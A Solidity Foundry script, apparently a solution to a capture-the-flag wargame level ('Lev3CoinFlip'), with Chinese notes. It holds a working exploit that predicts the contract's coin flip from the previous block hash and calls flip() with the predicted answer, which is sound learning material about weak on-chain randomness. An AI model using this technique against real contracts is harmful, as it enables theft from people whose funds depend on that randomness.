// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Lev3CoinFlip.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

// notes
// 連續十次猜對擲硬幣的結果(flip() 執行十次都 return true)
// 區塊鏈的偽隨機

// 因為沒辦法在同一區塊執行多次, 所以做一個一樣功能的 contract Player 並 run 10次
// 問題: 累積贏的次數 consecutiveWins 只會累加到 1, 就不會累加

contract Player {
    uint256 constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    constructor(Lev3CoinFlip _coinFlipInstance) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        _coinFlipInstance.flip(side);
    }
}

contract Lev3Sol is Script {
    Lev3CoinFlip public lev3Instance =
        Lev3CoinFlip(payable(0xf45CB64B1439147c1b491d8a979c7487Aafb9113));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        // write solution here
        new Player(lev3Instance);
        console.log("consecutiveWins: ", lev3Instance.consecutiveWins());
        vm.stopBroadcast();
    }
}
